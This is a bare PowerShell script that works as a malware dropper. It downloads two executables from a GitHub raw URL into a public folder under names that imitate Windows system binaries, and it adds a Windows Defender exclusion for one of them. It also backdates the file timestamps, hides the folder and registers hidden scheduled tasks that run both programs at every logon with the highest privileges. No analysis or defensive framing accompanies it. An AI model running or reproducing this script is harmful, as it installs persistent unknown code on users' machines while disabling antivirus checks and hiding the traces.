New-Item -ItemType Directory -Path C:\Users\Public\krnl

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl.exe"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/taskhostk.exe" -OutFile "C:\Users\Public\krnl\taskhostk.exe"

Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl.exe"

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name CreationTime -Value (Get-Date "2024-12-13 14:23:08")

Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl.exe" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:24:58")

Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl.exe" -Name CreationTime -Value (Get-Date "2024-12-13 14:24:57")

Set-ItemProperty -Path "C:\Users\Public\krnl\taskhostk.exe" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:25:58")

Set-ItemProperty -Path "C:\Users\Public\krnl\taskhostk.exe" -Name CreationTime -Value (Get-Date "2024-12-13 14:25:57")

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden

Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "C:\Users\Public\krnl\schvostkrnl.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -Hidden -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force

Register-ScheduledTask -TaskName "WINtaskhk" -Action (New-ScheduledTaskAction -Execute "C:\Users\Public\krnl\taskhostk.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -Hidden -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
